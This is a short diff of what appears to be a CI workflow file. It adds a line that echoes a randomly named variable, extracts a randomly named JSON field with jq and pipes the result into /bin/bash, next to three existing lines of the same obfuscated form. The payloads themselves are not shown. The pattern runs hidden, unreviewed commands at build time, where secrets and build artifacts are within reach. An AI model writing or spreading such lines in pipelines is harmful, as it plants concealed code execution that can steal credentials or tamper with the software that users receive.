@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$mr57746" | jq -r .kv6 | /bin/bash
           echo $kqtpi02 | jq -r .eir95723 | /bin/bash
           echo $xpab13 | jq -r .rpf477 | /bin/bash
+          echo $rpth8 | jq -r .ykrsi7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
